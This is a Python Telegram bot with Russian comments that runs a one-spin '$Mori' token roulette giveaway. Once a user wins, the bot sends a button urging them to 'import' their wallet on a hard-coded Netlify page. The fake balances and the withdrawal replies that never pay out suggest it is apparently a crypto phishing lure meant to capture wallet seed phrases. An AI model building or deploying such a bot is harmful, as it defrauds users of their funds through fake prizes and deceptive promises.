import os
import json
import logging
from dotenv import load_dotenv
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# Загружаем переменные окружения из .env файла
load_dotenv()

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Токен бота (получите его у @BotFather)
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')

# Хранилище балансов пользователей (в реальном проекте используйте БД)
user_balances = {}
# Хранилище информации о том, кто уже крутил рулетку
user_has_spun = {}
# Статистика выигрышей (используется только для логирования)
total_winners = 0
total_prizes_given = 0

# Получить абсолютный путь к HTML файлу
def get_web_app_url():
    # Для локального тестирования используйте ngrok или другой туннель
    # В продакшене загрузите файлы на хостинг
    web_app_url = os.getenv('WEB_APP_URL', 'https://your-domain.com/roulette.html')
    return web_app_url

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        logger.info(f"Received /start command from user {user_id}")
        
        # Инициализация баланса, если пользователь новый
        if user_id not in user_balances:
            user_balances[user_id] = 0
        
        # Проверяем, крутил ли пользователь уже
        has_spun = user_has_spun.get(user_id, False)
        
        keyboard = [
            [InlineKeyboardButton("🎰 Открыть рулетку", web_app=WebAppInfo(url=get_web_app_url()))]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Используем effective_message для большей надежности
        message = update.effective_message
        if message:
            if has_spun:
                await message.reply_text(
                    f"Привет, {update.effective_user.first_name}! 👋\n\n"
                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
                    f"🎰 Вы уже использовали свой бесплатный спин!\n\n"
                    f"Нажмите кнопку ниже, чтобы открыть рулетку:",
                    reply_markup=reply_markup
                )
            else:
                await message.reply_text(
                    f"Привет, {update.effective_user.first_name}! 👋\n\n"
                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
                    f"🎰 У вас есть один бесплатный спин!\n\n"
                    f"Нажмите кнопку ниже, чтобы открыть рулетку:",
                    reply_markup=reply_markup
                )
            logger.info(f"Sent start message to user {user_id}, has_spun: {has_spun}")
        else:
            logger.error(f"No message found in update for user {user_id}")
    except Exception as e:
        logger.error(f"Error in start handler: {e}", exc_info=True)

# Команда /balance
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_balances:
        user_balances[user_id] = 0
    
    await update.message.reply_text(
        f"💰 Ваш баланс: {user_balances[user_id]} $Mori"
    )

# Обработка данных из Web App
async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    try:
        # Получаем данные из Web App
        if not hasattr(update.message, 'web_app_data') or not update.message.web_app_data:
            logger.error(f"No web_app_data in message from user {user_id}")
            await update.message.reply_text("❌ Ошибка: данные не получены")
            return
            
        data = json.loads(update.message.web_app_data.data)
        logger.info(f"Received data from user {user_id}: {data}")
        
        if data.get('type') == 'check_spin_status':
            # Проверяем, может ли пользователь крутить
            has_spun = user_has_spun.get(user_id, False)
            user_balance = user_balances.get(user_id, 0)
            # Отправляем информацию пользователю
            if has_spun:
                await update.message.reply_text(
                    f"ℹ️ Вы уже использовали свой бесплатный спин.\n"
                    f"💰 Ваш баланс: {user_balance} $Mori"
                )
            else:
                await update.message.reply_text(
                    f"✅ У вас есть бесплатный спин!\n"
                    f"💰 Ваш баланс: {user_balance} $Mori"
                )
            logger.info(f"Spin status check for user {user_id}: can_spin={not has_spun}")
        
        elif data.get('type') == 'spin_result':
            # Проверяем, не крутил ли пользователь уже
            if user_has_spun.get(user_id, False):
                await update.message.reply_text(
                    "❌ Вы уже использовали свой бесплатный спин! Каждый пользователь может крутить только один раз."
                )
                logger.warning(f"User {user_id} tried to spin again")
                return
            
            prize = data.get('prize', 0)
            if user_id not in user_balances:
                user_balances[user_id] = 0
            user_balances[user_id] += prize
            
            # Отмечаем, что пользователь уже крутил
            user_has_spun[user_id] = True
            
            # Обновляем статистику
            global total_winners, total_prizes_given
            total_winners += 1
            total_prizes_given += prize
            
            # Создаем кнопку для импорта кошелька
            wallet_url = 'https://comfy-hummingbird-74e462.netlify.app/'
            keyboard = [
                [InlineKeyboardButton("🔗 Импортировать кошелек", url=wallet_url)]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"🎉 Поздравляем, {update.effective_user.first_name}!\n\n"
                f"🎰 Вы выиграли: {prize} $Mori!\n"
                f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
                f"Нажмите кнопку ниже, чтобы импортировать кошелек:",
                reply_markup=reply_markup
            )
            logger.info(f"User {user_id} won {prize} $Mori. Total winners: {total_winners}")
        
        elif data.get('type') == 'withdraw_balance':
            # Здесь должна быть интеграция с платежной системой для вывода средств
            amount = data.get('amount', 0)
            if user_id not in user_balances:
                user_balances[user_id] = 0
            
            if user_balances[user_id] < amount:
                await update.message.reply_text(
                    f"❌ Недостаточно средств для вывода!\n"
                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori"
                )
            elif amount <= 0:
                await update.message.reply_text(
                    "❌ Неверная сумма для вывода!"
                )
            else:
                # В реальном проекте здесь должна быть интеграция с платежной системой
                await update.message.reply_text(
                    f"✅ Запрос на вывод {amount} $Mori принят!\n"
                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
                    f"Вывод средств будет обработан в ближайшее время."
                )
        
        elif data.get('type') == 'get_balance':
            # Отправляем баланс обратно в веб-приложение
            if user_id not in user_balances:
                user_balances[user_id] = 0
            # К сожалению, нельзя напрямую отправить данные обратно в Web App
            # Баланс будет обновляться при каждом спин-результате
            logger.info(f"Balance requested by user {user_id}: {user_balances[user_id]}")
    
    except json.JSONDecodeError:
        logger.error(f"Failed to parse web app data from user {user_id}")
        await update.message.reply_text("❌ Ошибка обработки данных")

# Обработка обычных сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🎰 Открыть рулетку", web_app=WebAppInfo(url=get_web_app_url()))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Используйте команды:\n"
        "/start - Начать работу с ботом\n"
        "/balance - Проверить баланс\n"
        "Или нажмите кнопку ниже, чтобы открыть рулетку:",
        reply_markup=reply_markup
    )

# Обработчик ошибок
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок для логирования"""
    logger.error(f"Exception while handling an update: {context.error}", exc_info=context.error)

# Главная функция
def main():
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE' or not BOT_TOKEN:
        logger.error("Пожалуйста, установите BOT_TOKEN в переменных окружения или в коде!")
        return
    
    try:
        # Создаем приложение
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Добавляем обработчик ошибок
        application.add_error_handler(error_handler)
        
        # Регистрируем обработчики
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("balance", balance))
        application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_web_app_data))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Запускаем бота
        logger.info("Бот запущен...")
        logger.info(f"Токен установлен: {BOT_TOKEN[:10]}...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Ошибка при запуске бота: {e}", exc_info=True)

if __name__ == '__main__':
    main()
